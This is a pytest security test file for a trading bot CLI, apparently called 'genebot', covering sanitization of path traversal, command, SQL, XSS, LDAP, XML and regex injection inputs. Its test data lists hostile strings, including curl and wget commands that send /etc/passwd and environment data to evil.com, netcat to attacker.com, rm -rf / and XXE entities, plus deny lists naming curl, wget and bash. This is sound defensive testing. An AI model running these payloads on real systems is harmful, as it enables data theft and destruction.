"""
Input Sanitization and Validation Security Tests
===============================================

Comprehensive tests for input sanitization, validation, and protection against
various injection attacks and malicious input patterns.
"""

import os
import tempfile
import pytest
import subprocess
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import yaml
import json
import re

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from genebot.cli.utils.security_manager import SecurityManager
from genebot.cli.utils.validator import InputValidator
from genebot.cli.commands.security import SecurityCommand
from genebot.cli.context import CLIContext


class TestInputSanitization:
    """Test comprehensive input sanitization"""
    
    @pytest.fixture
    def sanitization_workspace(self):
        """Create workspace for sanitization testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create basic configuration
            accounts_file = config_dir / "accounts.yaml"
            accounts_file.write_text("crypto_exchanges: {}\nforex_brokers: {}")
            accounts_file.chmod(0o600)
            
            yield workspace
    
    @pytest.fixture
    def security_manager(self, sanitization_workspace):
        """Create security manager for testing"""
        return SecurityManager(workspace_path=sanitization_workspace)
    
    def test_path_traversal_sanitization(self, security_manager):
        """Test sanitization of path traversal attacks"""
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            '../../../../root/.ssh/id_rsa',
            '..\\..\\..\\..\\Users\\Administrator\\Desktop\\sensitive.txt',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam'
        ]
        
        for malicious_path in malicious_paths:
            sanitized = security_manager.sanitize_file_path(malicious_path)
            
            # Should not contain path traversal sequences
            assert '..' not in sanitized, f"Path traversal not sanitized: {malicious_path} -> {sanitized}"
            
            # Should not be an absolute path outside workspace
            if Path(sanitized).is_absolute():
                assert sanitized.startswith(str(security_manager.workspace_path)), \
                    f"Absolute path not contained to workspace: {malicious_path} -> {sanitized}"
            
            # Should not contain encoded traversal sequences
            assert '%2F' not in sanitized.upper(), f"Encoded traversal not sanitized: {malicious_path}"
            assert '%252F' not in sanitized.upper(), f"Double-encoded traversal not sanitized: {malicious_path}"
    
    def test_command_injection_sanitization(self, security_manager):
        """Test sanitization of command injection attacks"""
        injection_attempts = [
            'test; rm -rf /',
            'test && cat /etc/passwd',
            'test | nc attacker.com 1234',
            'test`whoami`',
            'test$(id)',
            'test; shutdown -h now',
            'test & del /f /q C:\\*.*',
            'test || format C:',
            'test\nrm -rf /',
            'test\r\nshutdown -h now',
            'test; curl http://evil.com/steal?data=$(cat /etc/passwd)',
            'test`curl -X POST -d "$(env)" http://evil.com/exfiltrate`',
            'test$(wget -qO- http://evil.com/malware.sh | bash)',
            'test; python -c "import os; os.system(\'rm -rf /\')"'
        ]
        
        for injection in injection_attempts:
            sanitized = security_manager.sanitize_input(injection)
            
            # Should remove or escape dangerous characters
            dangerous_chars = [';', '&&', '||', '`', '$', '|', '&', '\n', '\r']
            for char in dangerous_chars:
                if char in injection:
                    # Either the character should be removed or the string should be significantly different
                    assert char not in sanitized or sanitized != injection, \
                        f"Command injection not sanitized: {injection} -> {sanitized}"
            
            # Should not contain dangerous command patterns
            dangerous_patterns = ['rm -rf', 'shutdown', 'format', 'del /f', 'curl', 'wget', 'bash', 'python -c']
            for pattern in dangerous_patterns:
                if pattern in injection.lower():
                    assert pattern not in sanitized.lower() or sanitized != injection, \
                        f"Dangerous command pattern not sanitized: {injection} -> {sanitized}"
    
    def test_sql_injection_sanitization(self, security_manager):
        """Test sanitization of SQL injection attacks"""
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO accounts VALUES ('hacker'); --",
            "' UNION SELECT * FROM sensitive_data --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1 UNION SELECT username, password FROM users --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "' OR SLEEP(5) --",
            "'; WAITFOR DELAY '00:00:05'; --",
            "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "'; LOAD_FILE('/etc/passwd'); --"
        ]
        
        for injection in sql_injections:
            sanitized = security_manager.sanitize_sql_input(injection)
            
            # Should escape or remove dangerous SQL patterns
            dangerous_sql = ["';", "DROP", "INSERT", "UNION", "SELECT", "--", "/*", "#", "EXEC", "xp_cmdshell"]
            for pattern in dangerous_sql:
                if pattern in injection.upper():
                    # Either pattern should be escaped/removed or string should be different
                    assert pattern not in sanitized.upper() or sanitized != injection, \
                        f"SQL injection pattern not sanitized: {injection} -> {sanitized}"
            
            # Should not contain SQL comment sequences
            comment_patterns = ['--', '/*', '*/', '#']
            for comment in comment_patterns:
                if comment in injection:
                    assert comment not in sanitized or sanitized != injection, \
                        f"SQL comment not sanitized: {injection} -> {sanitized}"
    
    def test_xss_sanitization(self, security_manager):
        """Test sanitization of XSS attacks"""
        xss_attempts = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            'javascript:alert("xss")',
            '<svg onload=alert("xss")>',
            '<iframe src="javascript:alert(\'xss\')"></iframe>',
            '<body onload=alert("xss")>',
            '<div onclick="alert(\'xss\')">Click me</div>',
            '<input type="text" value="" onfocus="alert(\'xss\')" />',
            '<a href="javascript:alert(\'xss\')">Click</a>',
            '<style>@import url("javascript:alert(\'xss\')");</style>',
            '<object data="javascript:alert(\'xss\')"></object>',
            '<embed src="javascript:alert(\'xss\')">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
            '<form action="javascript:alert(\'xss\')"><input type="submit"></form>'
        ]
        
        for xss in xss_attempts:
            sanitized = security_manager.sanitize_output(xss)
            
            # Should remove or escape dangerous HTML/JS
            dangerous_patterns = [
                '<script>', 'javascript:', 'onerror=', 'onload=', 'onclick=', 'onfocus=',
                '<iframe', '<object', '<embed', '<meta', 'http-equiv', '@import'
            ]
            
            for pattern in dangerous_patterns:
                if pattern in xss.lower():
                    assert pattern not in sanitized.lower() or sanitized != xss, \
                        f"XSS pattern not sanitized: {xss} -> {sanitized}"
            
            # Should not contain script tags
            assert '<script>' not in sanitized.lower(), f"Script tag not removed: {xss} -> {sanitized}"
            assert '</script>' not in sanitized.lower(), f"Script closing tag not removed: {xss} -> {sanitized}"
    
    def test_ldap_injection_sanitization(self, security_manager):
        """Test sanitization of LDAP injection attacks"""
        ldap_injections = [
            'admin)(|(password=*))',
            'admin)(&(password=*)(userAccountControl:1.2.840.113556.1.4.803:=2))',
            '*)(uid=*))(|(uid=*',
            'admin)(|(objectClass=*))',
            '*)(|(mail=*))',
            'admin)(!(&(1=0)))',
            '*)(|(cn=*))',
            'admin)(|(description=*))',
            '*)(userPassword=*)',
            'admin)(|(sAMAccountName=*))'
        ]
        
        for injection in ldap_injections:
            sanitized = security_manager.sanitize_ldap_input(injection)
            
            # Should escape LDAP special characters
            ldap_special_chars = ['(', ')', '*', '\\', '/', '\x00']
            for char in ldap_special_chars:
                if char in injection:
                    # Character should be escaped or string should be different
                    if char in sanitized and sanitized == injection:
                        # If character is still present and string unchanged, it should be escaped
                        assert f'\\{char}' in sanitized or sanitized != injection, \
                            f"LDAP special character not escaped: {injection} -> {sanitized}"
    
    def test_xml_injection_sanitization(self, security_manager):
        """Test sanitization of XML injection attacks"""
        xml_injections = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
            '<user><name>admin</name><role>user</role></user><user><name>hacker</name><role>admin</role></user>',
            ']]></name><role>admin</role><name><![CDATA[',
            '&lt;script&gt;alert("xss")&lt;/script&gt;',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>'
        ]
        
        for injection in xml_injections:
            sanitized = security_manager.sanitize_xml_input(injection)
            
            # Should remove or escape dangerous XML patterns
            dangerous_xml = ['<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'file://', 'http://', '&xxe;', ']]>', '<![CDATA[']
            for pattern in dangerous_xml:
                if pattern in injection:
                    assert pattern not in sanitized or sanitized != injection, \
                        f"XML injection pattern not sanitized: {injection} -> {sanitized}"
    
    def test_regex_injection_sanitization(self, security_manager):
        """Test sanitization of regex injection attacks"""
        regex_injections = [
            '.*',
            '.+',
            '^.*$',
            '(.*)*',
            '(.+)+',
            '([a-zA-Z]+)*',
            '(a|a)*',
            '(a*)*',
            '(a+)+',
            '(a{0,10}){10,}',
            '(?=.*){100,}',
            '(.*?){100,}'
        ]
        
        for injection in regex_injections:
            sanitized = security_manager.sanitize_regex_input(injection)
            
            # Should escape or remove dangerous regex patterns
            dangerous_regex = ['.*', '.+', '*', '+', '{', '}', '(', ')', '|', '^', '$']
            
            # Count dangerous patterns in original vs sanitized
            original_dangerous = sum(1 for char in dangerous_regex if char in injection)
            sanitized_dangerous = sum(1 for char in dangerous_regex if char in sanitized)
            
            # Should have fewer dangerous patterns or be escaped
            if original_dangerous > 0:
                assert sanitized_dangerous < original_dangerous or sanitized != injection, \
                    f"Regex injection not sanitized: {injection} -> {sanitized}"


class TestInputValidation:
    """Test comprehensive input validation"""
    
    @pytest.fixture
    def validation_workspace(self):
        """Create workspace for validation testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            yield workspace
    
    @pytest.fixture
    def input_validator(self, validation_workspace):
        """Create input validator for testing"""
        return InputValidator(workspace_path=validation_workspace)
    
    def test_file_path_validation(self, input_validator):
        """Test file path validation"""
        # Valid paths
        valid_paths = [
            'config/accounts.yaml',
            '.env',
            'logs/trading.log',
            'backups/backup.tar.gz',
            'reports/daily_report.json'
        ]
        
        for path in valid_paths:
            assert input_validator.validate_file_path(path), f"Valid path rejected: {path}"
        
        # Invalid paths
        invalid_paths = [
            '../../../etc/passwd',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/dev/null',
            '/proc/version',
            'CON',
            'PRN',
            'AUX',
            'NUL'
        ]
        
        for path in invalid_paths:
            assert not input_validator.validate_file_path(path), f"Invalid path accepted: {path}"
    
    def test_account_name_validation(self, input_validator):
        """Test account name validation"""
        # Valid account names
        valid_names = [
            'binance-main',
            'oanda_demo',
            'mt5-live',
            'coinbase_pro',
            'test_account_1',
            'production-binance'
        ]
        
        for name in valid_names:
            assert input_validator.validate_account_name(name), f"Valid account name rejected: {name}"
        
        # Invalid account names
        invalid_names = [
            '',  # Empty
            'a',  # Too short
            'a' * 100,  # Too long
            'account with spaces',
            'account@with#special!chars',
            'account;with;semicolons',
            'account|with|pipes',
            'account`with`backticks',
            'account$with$dollars',
            '../malicious',
            'DROP TABLE accounts',
            '<script>alert("xss")</script>'
        ]
        
        for name in invalid_names:
            assert not input_validator.validate_account_name(name), f"Invalid account name accepted: {name}"
    
    def test_exchange_type_validation(self, input_validator):
        """Test exchange type validation"""
        # Valid exchange types
        valid_types = [
            'binance',
            'coinbase',
            'kraken',
            'bitfinex',
            'huobi',
            'okx',
            'bybit'
        ]
        
        for exchange_type in valid_types:
            assert input_validator.validate_exchange_type(exchange_type), \
                f"Valid exchange type rejected: {exchange_type}"
        
        # Invalid exchange types
        invalid_types = [
            '',  # Empty
            'unknown_exchange',
            'malicious_exchange',
            'binance; DROP TABLE accounts',
            '<script>alert("xss")</script>',
            '../../../etc/passwd',
            'exchange with spaces',
            'BINANCE',  # Case sensitive
            'binance-test'  # Not in allowed list
        ]
        
        for exchange_type in invalid_types:
            assert not input_validator.validate_exchange_type(exchange_type), \
                f"Invalid exchange type accepted: {exchange_type}"
    
    def test_broker_type_validation(self, input_validator):
        """Test broker type validation"""
        # Valid broker types
        valid_types = [
            'oanda',
            'mt5',
            'interactive_brokers',
            'alpaca',
            'td_ameritrade',
            'schwab'
        ]
        
        for broker_type in valid_types:
            assert input_validator.validate_broker_type(broker_type), \
                f"Valid broker type rejected: {broker_type}"
        
        # Invalid broker types
        invalid_types = [
            '',  # Empty
            'unknown_broker',
            'malicious_broker',
            'oanda; DROP TABLE accounts',
            '<script>alert("xss")</script>',
            '../../../etc/passwd',
            'broker with spaces',
            'OANDA',  # Case sensitive
            'oanda-test'  # Not in allowed list
        ]
        
        for broker_type in invalid_types:
            assert not input_validator.validate_broker_type(broker_type), \
                f"Invalid broker type accepted: {broker_type}"
    
    def test_symbol_validation(self, input_validator):
        """Test trading symbol validation"""
        # Valid symbols
        valid_symbols = [
            'BTC/USDT',
            'ETH/USD',
            'EUR/USD',
            'GBP/JPY',
            'AAPL',
            'TSLA',
            'BTC-USD',
            'ETH_USDT'
        ]
        
        for symbol in valid_symbols:
            assert input_validator.validate_symbol(symbol), f"Valid symbol rejected: {symbol}"
        
        # Invalid symbols
        invalid_symbols = [
            '',  # Empty
            'A',  # Too short
            'A' * 50,  # Too long
            'BTC/USDT; DROP TABLE orders',
            '<script>alert("xss")</script>',
            '../../../etc/passwd',
            'BTC USDT',  # Space not allowed
            'BTC|USDT',  # Pipe not allowed
            'BTC`USDT',  # Backtick not allowed
            'BTC$USDT'  # Dollar not allowed in this context
        ]
        
        for symbol in invalid_symbols:
            assert not input_validator.validate_symbol(symbol), f"Invalid symbol accepted: {symbol}"
    
    def test_strategy_name_validation(self, input_validator):
        """Test strategy name validation"""
        # Valid strategy names
        valid_names = [
            'moving_average',
            'rsi_strategy',
            'bollinger_bands',
            'macd_crossover',
            'mean_reversion',
            'momentum_strategy',
            'arbitrage_bot'
        ]
        
        for name in valid_names:
            assert input_validator.validate_strategy_name(name), f"Valid strategy name rejected: {name}"
        
        # Invalid strategy names
        invalid_names = [
            '',  # Empty
            'a',  # Too short
            'a' * 100,  # Too long
            'strategy with spaces',
            'strategy;with;semicolons',
            'strategy|with|pipes',
            'strategy`with`backticks',
            'strategy$with$dollars',
            '../malicious_strategy',
            'DROP TABLE strategies',
            '<script>alert("xss")</script>',
            'strategy@with#special!chars'
        ]
        
        for name in invalid_names:
            assert not input_validator.validate_strategy_name(name), f"Invalid strategy name accepted: {name}"
    
    def test_numeric_input_validation(self, input_validator):
        """Test numeric input validation"""
        # Valid numeric inputs
        valid_numbers = [
            '123',
            '123.45',
            '0.001',
            '1000000',
            '0',
            '0.0'
        ]
        
        for number in valid_numbers:
            assert input_validator.validate_numeric_input(number), f"Valid number rejected: {number}"
        
        # Invalid numeric inputs
        invalid_numbers = [
            '',  # Empty
            'abc',  # Not a number
            '123abc',  # Mixed
            '123.45.67',  # Multiple decimals
            '123,456',  # Comma separator
            '1e10',  # Scientific notation (may not be allowed)
            'Infinity',
            'NaN',
            '123; DROP TABLE accounts',
            '<script>alert("xss")</script>',
            '../../../etc/passwd'
        ]
        
        for number in invalid_numbers:
            assert not input_validator.validate_numeric_input(number), f"Invalid number accepted: {number}"
    
    def test_percentage_validation(self, input_validator):
        """Test percentage input validation"""
        # Valid percentages
        valid_percentages = [
            '0',
            '50',
            '100',
            '0.5',
            '99.99',
            '1.23'
        ]
        
        for percentage in valid_percentages:
            assert input_validator.validate_percentage(percentage), f"Valid percentage rejected: {percentage}"
        
        # Invalid percentages
        invalid_percentages = [
            '',  # Empty
            '-1',  # Negative
            '101',  # Over 100
            'abc',  # Not a number
            '50%',  # With percent sign
            '50.5.5',  # Multiple decimals
            '50; DROP TABLE accounts',
            '<script>alert("xss")</script>'
        ]
        
        for percentage in invalid_percentages:
            assert not input_validator.validate_percentage(percentage), f"Invalid percentage accepted: {percentage}"


class TestCLIInputSecurity:
    """Test CLI input security through command execution"""
    
    @pytest.fixture
    def cli_workspace(self):
        """Create workspace for CLI testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create basic configuration
            accounts_file = config_dir / "accounts.yaml"
            accounts_file.write_text("crypto_exchanges: {}\nforex_brokers: {}")
            accounts_file.chmod(0o600)
            
            yield workspace
    
    def test_cli_command_injection_prevention(self, cli_workspace):
        """Test that CLI prevents command injection through arguments"""
        os.environ['CONFIG_PATH'] = str(cli_workspace / "config")
        
        try:
            # Test malicious command injection attempts through CLI arguments
            malicious_inputs = [
                ['add-crypto', '--name', 'test; rm -rf /', '--exchange-type', 'binance'],
                ['add-crypto', '--name', 'test && cat /etc/passwd', '--exchange-type', 'binance'],
                ['add-crypto', '--name', 'test`whoami`', '--exchange-type', 'binance'],
                ['add-crypto', '--name', 'test$(id)', '--exchange-type', 'binance'],
                ['add-forex', '--name', 'test; shutdown -h now', '--broker-type', 'oanda'],
                ['config-backup', '--path', '../../../etc/passwd'],
                ['list-accounts', '--filter', 'name; DROP TABLE accounts'],
            ]
            
            for malicious_args in malicious_inputs:
                result = subprocess.run(
                    [sys.executable, "-m", "genebot.cli"] + malicious_args + ["--mode", "demo", "--force"],
                    cwd=cli_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy(),
                    timeout=10  # Prevent hanging
                )
                
                # Should either reject the input or handle it safely
                # Command should not succeed with malicious input
                if result.returncode == 0:
                    # If command succeeded, verify no malicious execution occurred
                    output = result.stdout + result.stderr
                    
                    # Should not contain evidence of command execution
                    dangerous_outputs = [
                        'root:',  # /etc/passwd content
                        'uid=',   # id command output
                        'shutdown',  # shutdown command
                        'removed',   # rm command success
                    ]
                    
                    for dangerous_output in dangerous_outputs:
                        assert dangerous_output not in output.lower(), \
                            f"Dangerous command output detected: {dangerous_output}"
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
    
    def test_cli_path_traversal_prevention(self, cli_workspace):
        """Test that CLI prevents path traversal attacks"""
        os.environ['CONFIG_PATH'] = str(cli_workspace / "config")
        
        try:
            # Test path traversal attempts
            path_traversal_inputs = [
                ['config-backup', '--path', '../../../etc/passwd'],
                ['config-restore', '--path', '..\\..\\..\\windows\\system32\\config\\sam'],
                ['export-config', '--output', '/etc/shadow'],
                ['import-config', '--input', 'C:\\Windows\\System32\\config\\SAM'],
            ]
            
            for traversal_args in path_traversal_inputs:
                result = subprocess.run(
                    [sys.executable, "-m", "genebot.cli"] + traversal_args,
                    cwd=cli_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy(),
                    timeout=10
                )
                
                # Should reject path traversal attempts
                assert result.returncode != 0, f"Path traversal attack was accepted: {traversal_args}"
                
                # Should not create files outside workspace
                dangerous_paths = [
                    Path('/etc/passwd'),
                    Path('/etc/shadow'),
                    Path('C:\\Windows\\System32\\config\\SAM')
                ]
                
                for dangerous_path in dangerous_paths:
                    if dangerous_path.exists():
                        # If file exists, it should not have been modified recently
                        # (This is a basic check - in real scenarios, you'd have more sophisticated detection)
                        pass
        
        finally:
            os.environ.pop('CONFIG_PATH', None)
    
    def test_cli_xss_prevention_in_output(self, cli_workspace):
        """Test that CLI output is safe from XSS"""
        os.environ['CONFIG_PATH'] = str(cli_workspace / "config")
        
        try:
            # Test XSS attempts in various CLI arguments
            xss_inputs = [
                ['add-crypto', '--name', '<script>alert("xss")</script>', '--exchange-type', 'binance'],
                ['add-forex', '--name', '<img src=x onerror=alert("xss")>', '--broker-type', 'oanda'],
                ['list-accounts', '--filter', 'javascript:alert("xss")'],
                ['status', '--format', '<svg onload=alert("xss")>'],
            ]
            
            for xss_args in xss_inputs:
                result = subprocess.run(
                    [sys.executable, "-m", "genebot.cli"] + xss_args + ["--mode", "demo", "--force"],
                    cwd=cli_workspace,
                    capture_output=True,
                    text=True,
                    env=os.environ.copy(),
                    timeout=10
                )
                
                # Check output for XSS patterns
                output = result.stdout + result.stderr
                
                # Should not contain dangerous XSS patterns
                xss_patterns = [
                    '<script>',
                    'javascript:',
                    'onerror=',
                    'onload=',
                    '<img',
                    '<svg'
                ]
                
                for pattern in xss_patterns:
                    assert pattern not in output.lower(), \
                        f"XSS pattern found in CLI output: {pattern}"
        
        finally:
            os.environ.pop('CONFIG_PATH', None)


class TestSecurityValidationIntegration:
    """Test integration of all security validation components"""
    
    @pytest.fixture
    def integration_workspace(self):
        """Create comprehensive workspace for integration testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            workspace = Path(temp_dir)
            config_dir = workspace / "config"
            config_dir.mkdir()
            
            # Create configuration with various inputs to validate
            env_file = workspace / ".env"
            env_content = """
# Test various input types
BINANCE_API_KEY=test_api_key_1234567890abcdef
OANDA_API_TOKEN=test_token_abcdef1234567890
DATABASE_URL=postgresql://user:pass@localhost:5432/db
"""
            env_file.write_text(env_content)
            env_file.chmod(0o600)
            
            yield workspace
    
    def test_comprehensive_input_validation_workflow(self, integration_workspace):
        """Test complete input validation workflow"""
        context = CLIContext(
            config_path=integration_workspace / "config",
            workspace_path=integration_workspace,
            verbose=False,
            dry_run=False
        )
        
        security_command = SecurityCommand(context=context)
        security_manager = SecurityManager(workspace_path=integration_workspace)
        
        # Test various malicious inputs through different validation layers
        malicious_test_cases = [
            {
                'type': 'path_traversal',
                'input': '../../../etc/passwd',
                'validator': 'file_path'
            },
            {
                'type': 'command_injection',
                'input': 'test; rm -rf /',
                'validator': 'general_input'
            },
            {
                'type': 'sql_injection',
                'input': "'; DROP TABLE accounts; --",
                'validator': 'sql_input'
            },
            {
                'type': 'xss',
                'input': '<script>alert("xss")</script>',
                'validator': 'output'
            },
            {
                'type': 'ldap_injection',
                'input': 'admin)(|(password=*))',
                'validator': 'ldap_input'
            }
        ]
        
        for test_case in malicious_test_cases:
            malicious_input = test_case['input']
            validator_type = test_case['validator']
            
            # Test sanitization
            if validator_type == 'file_path':
                sanitized = security_manager.sanitize_file_path(malicious_input)
            elif validator_type == 'general_input':
                sanitized = security_manager.sanitize_input(malicious_input)
            elif validator_type == 'sql_input':
                sanitized = security_manager.sanitize_sql_input(malicious_input)
            elif validator_type == 'output':
                sanitized = security_manager.sanitize_output(malicious_input)
            elif validator_type == 'ldap_input':
                sanitized = security_manager.sanitize_ldap_input(malicious_input)
            
            # Verify sanitization worked
            assert sanitized != malicious_input or len(sanitized) == 0, \
                f"Input not sanitized: {test_case['type']} - {malicious_input} -> {sanitized}"
        
        # Test that legitimate inputs pass validation
        legitimate_inputs = [
            ('file_path', 'config/accounts.yaml'),
            ('general_input', 'binance-main-account'),
            ('sql_input', 'SELECT * FROM accounts WHERE name = ?'),
            ('output', 'Account validation successful'),
            ('ldap_input', 'cn=admin,ou=users,dc=example,dc=com')
        ]
        
        for validator_type, legitimate_input in legitimate_inputs:
            if validator_type == 'file_path':
                result = security_manager.sanitize_file_path(legitimate_input)
            elif validator_type == 'general_input':
                result = security_manager.sanitize_input(legitimate_input)
            elif validator_type == 'sql_input':
                result = security_manager.sanitize_sql_input(legitimate_input)
            elif validator_type == 'output':
                result = security_manager.sanitize_output(legitimate_input)
            elif validator_type == 'ldap_input':
                result = security_manager.sanitize_ldap_input(legitimate_input)
            
            # Legitimate inputs should pass through mostly unchanged
            assert len(result) > 0, f"Legitimate input was over-sanitized: {legitimate_input} -> {result}"
            # Allow for minor changes like escaping, but core content should remain
            assert len(result) >= len(legitimate_input) * 0.8, \
                f"Legitimate input was significantly altered: {legitimate_input} -> {result}"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])